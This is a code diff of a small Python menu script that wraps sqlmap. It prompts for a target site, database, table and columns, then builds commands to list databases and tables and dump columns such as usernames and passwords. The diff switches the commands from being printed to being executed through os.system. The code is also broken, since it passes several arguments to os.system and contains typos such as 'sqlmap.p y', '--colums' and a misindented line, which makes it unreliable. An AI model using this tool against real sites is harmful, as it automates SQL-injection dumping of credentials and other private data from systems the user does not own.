@@ -22,25 +22,25 @@ while True:
 
   if secim== 1:
     site=str(input("site:"))
-    print("python2 sqlmap.py -u ",site," --dbs")
+    os.system("python2 sqlmap.py -u ",site," --dbs")
 
   elif secim ==2:
     site=str(input("site:"))
     db=str(input("database:"))
-    print("python2 sqlmap.py -u ",site," -D ",db ," --tables")
+    os.system("python2 sqlmap.py -u ",site," -D ",db ," --tables")
 
   elif secim==3:
     site=str(input("site:"))
     db=str(input("database:"))
     table=str(input( "tables:"))
-    print("python2 sqlmap.p y -u ",site," -D ",db, " -T ",table ," --colums")
+    os.system("python2 sqlmap.p y -u ",site," -D ",db, " -T ",table ," --colums")
 
   elif secim==4:
     site=str(input("site:"))
     db=str(input("database:"))
     table=str(input("tables:"))
-    colum=str(input("colums(exemples:user,passwd,r oot):"))
-    print("python2 sqlmap.py -u ",site," -D ",db ," -T ",table ," -C ",colum," --dump")
+   colum=str(input("colums(exemples:user,passwd,r oot):"))
+    os.system("python2 sqlmap.py -u ",site," -D ",db ," -T ",table ," -C ",colum," --dump")
 
   elif 5==secim:
     break
